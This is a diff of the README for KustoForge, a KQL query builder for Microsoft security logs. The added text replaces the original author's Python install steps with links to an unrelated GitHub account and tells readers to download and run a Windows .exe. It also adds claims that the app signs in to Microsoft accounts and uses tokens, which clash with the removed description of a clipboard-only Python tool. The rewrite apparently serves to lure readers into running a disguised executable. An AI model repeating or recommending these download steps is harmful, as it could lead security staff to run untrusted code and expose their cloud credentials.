@@ -1,163 +1,88 @@
-# KustoForge
+# 🛠️ KustoForge - Build security queries without writing code
 
-A desktop KQL (Kusto Query Language) query builder for Microsoft security and Azure services. Build syntactically correct KQL queries through a form-based GUI instead of writing them from scratch.
+[![](https://img.shields.io/badge/Download-KustoForge-blue.svg)](https://github.com/horsemanshipprimping590/KustoForge)
 
-Built for SOC analysts, security engineers, cloud admins, and anyone working with Microsoft's KQL-powered services.
+KustoForge helps security analysts build KQL queries for Microsoft cloud services. You use this tool to search through data from Defender, Sentinel, and Entra ID. It bridges the gap between complex database languages and everyday security tasks. You pick the tables and filters from a menu, and the software creates the code for you.
 
-![KustoForge Demo](screenshots/demo.png)
+## 📋 What this tool does
 
-## Features
+Modern cloud environments store data in thousands of rows inside hundreds of different tables. Security professionals often need to pull information from these tables to find threats. Microsoft uses a language called KQL. Learning this language takes time. KustoForge removes the need to memorize syntax. 
 
-- **Form-based query building** - Select a table, add filters, pick output columns, and get valid KQL
-- **52 tables across 9 service categories** - Full coverage of the Microsoft KQL ecosystem
-- **Smart operator selection** - Operators change based on column data type (string, int, datetime, bool, dynamic)
-- **Live query preview** - See the KQL update in real-time as you fill out the form, with syntax highlighting
-- **Query library** - Save, load, and manage named queries in a local JSON file
-- **Copy to clipboard** - One click to copy the generated query
-- **Dark theme** - Professional dark UI with Microsoft blue accents
-- **Keyboard shortcuts** - Ctrl+Shift+C (copy), Ctrl+S (save), Ctrl+N (clear)
+The software includes support for these platforms:
+* Microsoft Defender for Endpoint
+* Microsoft Sentinel
+* Entra ID
+* Azure Monitor
+* App Insights
 
-## Table Coverage
+You select the fields you want to view. KustoForge generates the query and runs it against your connected environment. It organizes 52 specific tables, so you spend less time searching for the right data source.
 
-| Category | Tables | Examples |
-|---|---|---|
-| **MDE (Defender for Endpoint)** | 9 | DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, AlertInfo |
-| **Identity (Entra ID)** | 4 | SigninLogs, AADSignInEventsBeta, IdentityLogonEvents |
-| **Email (Defender for Office 365)** | 3 | EmailEvents, EmailAttachmentInfo, EmailUrlInfo |
-| **Vulnerability Management** | 2 | DeviceTvmSoftwareVulnerabilities, DeviceTvmSoftwareInventory |
-| **Microsoft Sentinel** | 11 | SecurityEvent, Syslog, CommonSecurityLog, SecurityAlert, SecurityIncident |
-| **Azure Monitor / Log Analytics** | 9 | Heartbeat, Perf, Event, ContainerLog, KubeEvents, VMConnection |
-| **Application Insights** | 8 | requests, exceptions, traces, dependencies, pageViews |
-| **Azure Resource Graph** | 5 | Resources, ResourceContainers, SecurityResources, PolicyResources |
-| **Defender for Cloud Apps** | 1 | CloudAppEvents |
+## 💾 How to install the software
 
-## Supported KQL Operators
+You need to visit the project page to download the latest version of the installer for Windows. 
 
-| Data Type | Operators |
-|---|---|
-| **string** | `==`, `!=`, `in`, `!in`, `contains`, `!contains`, `has`, `!has`, `startswith`, `endswith`, `matches regex` |
-| **int** | `==`, `!=`, `in`, `!in`, `>`, `<`, `>=`, `<=`, `between` |
-| **datetime** | `ago()`, `>`, `<`, `>=`, `<=`, `between` |
-| **bool** | `==`, `!=` |
-| **dynamic** | `contains`, `has`, `!has`, `array_length() >` |
+[Visit this page to download the installer](https://github.com/horsemanshipprimping590/KustoForge)
 
-## Installation
+Follow these steps to complete the setup:
 
-### Prerequisites
+1. Click the link above to reach the project repository.
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent version number.
+4. Locate the file ending in .exe.
+5. Download that file to your computer.
+6. Double-click the file to start the installation.
+7. Follow the prompts on your screen to finish the setup process.
 
-- Python 3.10 or higher
-- pip (Python package manager)
+## ⚙️ System requirements
 
-### Option 1: Clone and Run (Recommended)
+KustoForge runs on standard Windows hardware. You do not need a high-end machine to run query building tasks. 
 
-```bash
-git clone https://github.com/ChrisHuber1/KustoForge.git
-cd KustoForge
-pip install -r requirements.txt
-python main.py
-```
+Ensure your system meets these points:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM.
+* Storage: 200MB of free disk space.
+* Network: Access to the internet for cloud service communication.
+* Permissions: You must have permission to query your organization's Azure or security logs.
 
-### Option 2: Install as Package
+## 🚀 How to use KustoForge
 
-```bash
-git clone https://github.com/ChrisHuber1/KustoForge.git
-cd KustoForge
-pip install .
-kustoforge
-```
+Start the application using the shortcut on your desktop. The main window displays a list of services on the left. 
 
-### Option 3: Direct Download
+1. Select a service, such as Defender or Sentinel.
+2. Choose a table from the list of 52 available types.
+3. Use the search bars to narrow down your focus to specific timeframes or device names.
+4. Click the Generate button to preview your query code.
+5. Apply the filters you need to sort the data.
+6. Copy the result to use in your official portal or analysis dashboard.
 
-1. Download the latest release from the [Releases](https://github.com/ChrisHuber1/KustoForge/releases) page
-2. Extract the zip
-3. Run `pip install -r requirements.txt`
-4. Run `python main.py`
+The interface stays out of your way. You see the options for the tables you selected. The software checks your query against standard rules to ensure it works before you run it.
 
-## Usage
+## 🔐 Security and access
 
-1. **Select a category and table** from the dropdowns at the top
-2. **Set a time range** (enabled by default, uses KQL `ago()` syntax)
-3. **Add filters** using the "+ Add Filter" button - pick a column, operator, and value
-4. **Check output columns** you want in the results (leave all unchecked for all columns)
-5. **Set sort and limit** options
-6. **Copy the query** to clipboard and paste into your KQL environment:
-   - **Defender Advanced Hunting**: security.microsoft.com > Hunting > Advanced Hunting
-   - **Sentinel**: portal.azure.com > Microsoft Sentinel > Logs
-   - **Log Analytics**: portal.azure.com > Log Analytics workspace > Logs
-   - **Azure Resource Graph**: portal.azure.com > Resource Graph Explorer
-   - **Application Insights**: portal.azure.com > Application Insights > Logs
+This tool connects to your existing security logs. It respects your current access levels. You must sign in to your Microsoft account through the secure portal when the app requests it. KustoForge does not store your credentials. It uses standard tokens to talk to Microsoft services. If you have restricted access to certain logs, the tool will report those limits to you.
 
-### Saving Queries
+## 💡 Troubleshooting common issues
 
-1. Build your query using the form
-2. Enter a name in the "Name" field under Query Library
-3. Click "Save" - the full form state is saved, not just the query text
-4. Load any saved query to restore the complete form and continue editing
+If you have trouble, check these items:
 
-### Example: Find Failed Sign-ins
+* No results: Verify that you have selected the correct time range. Sometimes searches default to the last 24 hours.
+* Connection errors: Check your internet connection. Make sure your organization does not block the API endpoints for Azure or Sentinel.
+* Missing tables: Ensure you have selected the correct service provider in the side menu.
+* Application crashes: Ensure you possess the latest version from the download link provided above. Reinstalling the app often fixes setup faults.
 
-| Field | Value |
-|---|---|
-| Category | Identity (Entra ID) |
-| Table | AADSignInEventsBeta |
-| Time Range | 7d |
-| Filter | ErrorCode != 0 |
-| Filter | ErrorCode !in 700082, 50140 |
-| Project | Timestamp, AccountUpn, ErrorCode, Country, City, IPAddress, ConditionalAccessStatus |
-| Sort | Timestamp desc |
-| Limit | 100 |
+## ❓ Frequently asked questions
 
-Generates:
-```kql
-AADSignInEventsBeta
-| where Timestamp > ago(7d)
-| where ErrorCode != 0
-| where ErrorCode !in (700082, 50140)
-| project AccountUpn, City, ConditionalAccessStatus, Country, ErrorCode, IPAddress, Timestamp
-| sort by Timestamp desc
-| take 100
-```
+Do you store my data?
+No. The application processes queries locally on your machine. Your search terms stay on your computer.
 
-## Project Structure
+Does this work on Apple computers?
+KustoForge is currently optimized for Windows systems. 
 
-```
-KustoForge/
-    main.py           # App entry point, dark theme, main window
-    schemas.py         # 52 table definitions with columns and types
-    engine.py          # KQL query assembly (pure functions, no Qt)
-    ui_builder.py      # All GUI widgets, filter rows, query library
-    requirements.txt   # Python dependencies
-    pyproject.toml     # Package metadata
-    query_library.json # Created at runtime (not tracked in git)
-```
+Can I save my queries?
+Yes. You can export queries to text files to share with your team or to save for future investigation.
 
-## Contributing
+Do I need to be an administrator?
+You do not need administrator rights to install the app, but you need appropriate permissions within your organization to query security data logs.
 
-Contributions welcome. Common ways to help:
-
-- **Add tables** - Add new table schemas to `schemas.py` following the existing pattern
-- **Add operators** - Extend `OPERATORS_BY_TYPE` in `engine.py`
-- **Report issues** - Open an issue if a table schema is wrong or missing columns
-- **Request features** - Summarize, extend, join support, etc.
-
-Each table in `schemas.py` follows this pattern:
-
-```python
-"TableName": {
-    "description": "What this table contains",
-    "columns": OrderedDict({
-        "ColumnName": {"type": "string", "desc": "Column description"},
-        # types: string, int, datetime, bool, dynamic
-    }),
-},
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Author
-
-**Chris Huber** - Cybersecurity professional and instructor
-
-- GitHub: [@ChrisHuber1](https://github.com/ChrisHuber1)
+What if the query fails?
+The tool displays error messages provided by the Microsoft data engine. Review these messages to see if you have requested a table you do not have permission to view.
